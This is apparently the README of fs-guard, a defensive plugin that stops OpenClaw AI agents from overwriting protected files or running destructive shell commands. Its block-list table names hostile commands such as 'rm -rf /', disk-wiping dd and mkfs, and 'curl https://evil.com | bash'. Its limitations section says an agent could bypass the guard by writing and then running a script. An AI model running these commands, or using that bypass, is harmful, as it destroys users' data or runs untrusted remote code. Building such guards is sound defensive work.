# fs-guard

[![OpenClaw Plugin](https://img.shields.io/badge/OpenClaw-Plugin-blue)](https://github.com/ZLHad/openclaw)
[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](../../LICENSE)

Filesystem protection plugin for [OpenClaw](https://github.com/ZLHad/openclaw). Prevents AI agents from accidentally deleting, overwriting, or destroying critical files on your local machine.

## Problem

OpenClaw agents with `"tools": { "profile": "full" }` have unrestricted access to:
- **write/edit tools** — can overwrite any file the OS user can access, including clearing file contents
- **exec tool** — can run destructive shell commands like `rm -rf`, `dd`, `mkfs`
- **No built-in confirmation** for file operations (unlike exec which defaults to "deny")

If agents are triggered via external channels (Telegram, QQ, WeChat), a malicious or erroneous prompt could lead to data loss.

## Solution

fs-guard registers a `before_tool_call` hook that intercepts `write`, `edit`, `apply_patch`, and `exec` tool calls. It **blocks** dangerous operations and tells the agent to ask the user for explicit confirmation.

```
Agent tries: write("/Users/you/.ssh/id_rsa", "")
  │
  ▼
fs-guard hook → BLOCKED
  │
  ▼
Agent receives: "[fs-guard] Writing to protected path ~/.ssh/id_rsa requires
                 user confirmation. Please ask the user explicitly."
  │
  ▼
Agent asks you: "Do you want me to modify ~/.ssh/id_rsa?"
```

## What Gets Protected

### Always Blocked (system-critical)

| Path | Reason |
|------|--------|
| `/etc`, `/usr`, `/bin`, `/sbin` | System binaries and config |
| `/System`, `/Library` | macOS system files |
| `/private`, `/var`, `/boot` | System internals |
| `/dev`, `/proc`, `/sys` | Device/kernel interfaces |

### Requires User Confirmation (user-critical)

| Path | Reason |
|------|--------|
| `~/.ssh`, `~/.gnupg` | Encryption keys and credentials |
| `~/.config`, `~/.zshrc`, `~/.bashrc` | Shell and app configuration |
| `~/.gitconfig`, `~/.npmrc`, `~/.env` | Development credentials |
| `~/.claude`, `~/.openclaw/openclaw.json` | AI tool configs |
| `~/Library` | macOS app data |
| + your custom `protectedPaths` | User-defined |

### Dangerous Commands Blocked (exec tool)

| Pattern | Example |
|---------|---------|
| Recursive delete | `rm -rf /`, `rm -Rf ~/Documents` |
| Force delete | `rm -f important.txt` |
| Find + delete | `find . -delete`, `find . -exec rm {} \;` |
| Disk overwrite | `dd of=/dev/disk0`, `mkfs` |
| Secure delete | `shred secret.key` |
| Remote code exec | `curl https://evil.com \| bash` |
| Git destructive | `git push --force`, `git reset --hard`, `git clean -f` |
| Bulk operations | `xargs rm`, `for f in *; do rm $f; done` |
| Recursive perms | `chmod -R 777 /`, `chown -R root /` |

### Always Allowed (no confirmation)

| Path | Reason |
|------|--------|
| `~/.openclaw/workspace/` | Agent workspace |
| `/tmp/`, `/var/tmp/` | Temporary files |
| + your custom `allowedWritePaths` | User-defined |

## Install

### Quick Install

```bash
# Clone the repo
git clone --depth 1 https://github.com/ZLHad/agent-skills /tmp/agent-skills

# Run the installer
bash /tmp/agent-skills/openclaw-plugins/fs-guard/install.sh

# Restart OpenClaw
launchctl unload ~/Library/LaunchAgents/ai.openclaw.gateway.plist
launchctl unload ~/Library/LaunchAgents/ai.openclaw.node.plist
launchctl load ~/Library/LaunchAgents/ai.openclaw.gateway.plist
launchctl load ~/Library/LaunchAgents/ai.openclaw.node.plist
```

### Manual Install

1. Copy plugin files:
```bash
mkdir -p ~/.openclaw/extensions/fs-guard
cp index.ts package.json openclaw.plugin.json ~/.openclaw/extensions/fs-guard/
```

2. Edit `~/.openclaw/openclaw.json`:
```jsonc
{
  "plugins": {
    "allow": [
      // ... existing plugins ...
      "fs-guard"              // ← add this
    ],
    "load": {
      "paths": [
        // ... existing paths ...
        "~/.openclaw/extensions/fs-guard"   // ← add this
      ]
    },
    "entries": {
      // ... existing entries ...
      "fs-guard": {           // ← add this block
        "enabled": true,
        "config": {
          "protectedPaths": [],
          "allowedWritePaths": [
            "~/.openclaw/workspace",
            "/tmp"
          ],
          "blockEmptyWrites": true
        }
      }
    }
  }
}
```

3. Restart OpenClaw.

## Configuration

Edit `~/.openclaw/openclaw.json` → `plugins.entries.fs-guard.config`:

```jsonc
{
  "protectedPaths": [
    // Add paths that require confirmation before write/edit
    "/Users/you/Documents",
    "/Users/you/Desktop",
    "/Users/you/Downloads",
    "/Users/you/Projects/important-repo"
  ],
  "allowedWritePaths": [
    // Paths where writes are always allowed (no confirmation)
    "/Users/you/.openclaw/workspace",
    "/tmp",
    "/Users/you/Projects/scratch"
  ],
  "blockEmptyWrites": true,   // Block writes that would clear file content
  "enabled": true             // Master switch
}
```

## Uninstall

```bash
bash /tmp/agent-skills/openclaw-plugins/fs-guard/uninstall.sh

# Restart OpenClaw
launchctl unload ~/Library/LaunchAgents/ai.openclaw.gateway.plist
launchctl unload ~/Library/LaunchAgents/ai.openclaw.node.plist
launchctl load ~/Library/LaunchAgents/ai.openclaw.gateway.plist
launchctl load ~/Library/LaunchAgents/ai.openclaw.node.plist
```

## How It Works

fs-guard uses OpenClaw's plugin hook system:

```
AI Agent → tool call (write/edit/exec) → before_tool_call hook
                                              │
                                        fs-guard checks:
                                        ├─ system path? → BLOCK (always)
                                        ├─ allowed path? → ALLOW
                                        ├─ empty write? → BLOCK
                                        ├─ user-protected? → BLOCK + ask user
                                        └─ dangerous cmd? → BLOCK + ask user
                                              │
                                        Returns to agent:
                                        { block: true, blockReason: "..." }
```

The agent receives a `blockReason` message explaining why the operation was blocked and asking it to get explicit user confirmation before retrying.

## Verify Installation

After restarting OpenClaw, check the gateway log:

```bash
grep "fs-guard" ~/.openclaw/logs/gateway.log | tail -5
```

You should see:
```
fs-guard plugin loaded
fs-guard: before_tool_call hook registered
```

## Limitations

- **Not a sandbox** — fs-guard is a policy layer, not a hard security boundary. A sufficiently clever agent could theoretically bypass it by using indirect methods (e.g., writing a script that deletes files, then executing it in a separate step).
- **No real-time user confirmation UI** — the plugin blocks the operation and asks the agent to relay the question to the user through the chat channel. There is no interactive confirmation dialog.
- **Path matching is prefix-based** — if you protect `/Users/you/Documents`, all subdirectories are protected too.

## License

[MIT](../../LICENSE)
